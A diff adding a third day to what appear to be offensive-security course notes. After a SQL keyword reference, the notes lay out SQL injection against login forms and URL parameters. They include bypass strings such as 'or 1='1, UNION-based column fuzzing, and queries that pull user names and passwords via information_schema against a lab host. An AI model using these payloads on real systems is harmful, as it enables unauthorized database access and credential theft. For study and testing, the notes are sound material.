@@ -193,7 +193,56 @@ DAY2
        - ssh www-data@x.x.x.x
     
     
-    
-    
-    
-    
+DAY3
+cd 
+     SQL
+
+         USE             select the DB you would like to use.
+         SELECT          extracts data from a database
+         UPDATE          updates data in a database
+         DELETE          deletes data from a database
+         INSERT INTO     inserts new data into a database
+         CREATE DATABASE creates a new database
+         ALTER DATABASE  modifies a database
+         CREATE TABLE    creates a new table
+         ALTER TABLE     modifies a table
+         DROP TABLE      deletes a table
+         CREATE INDEX    creates an index (search key)
+         DROP INDEX      deletes an index
+         UNION           Used to combine the result-set of two or more SELECT statements
+
+POST Method
+         - Determine vunerable webpage via truth statement ex. Audi' or 1='1; --
+         - Determine the number of columns that exist on the webpage via fuzzing ex. Audi' UNION select 1,2,3,4,5; #
+         - Determine the number of columns, the order, and if there are any hidden columns
+         - Dumping/extracting information via golden statement 
+              statement in question - SELECT table_schema,table_name,column_name FROM information_schema.columns
+               ex. Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns; # (found schema session, with table user, with columns name, pass)
+         - Extracting desired information
+               ex. Audi' UNION select id,2,name,pass,5 from session.user; #
+
+    user: 'or 1='1
+    pass: 'or 1='1
+    badguy.com/login.php?user='or1='1&pass='or1='1
+
+GET Method
+         - Determine vunerable webpage via truth statement
+            value or 1=1
+               ex. http://10.50.21.144/uniondemo.php?Selection=2 or 1=1
+         - Determine the number of columns that exist on the table displayed on the webpage via fuzzing
+            see step 1
+         - Determine the number of columns, the order, and if there are any hidden columns
+            
+         - Dumping/extracting information via golden statement
+         
+         
+         
+         
+         
+         
+         
+         
+         
+         
+         
+         
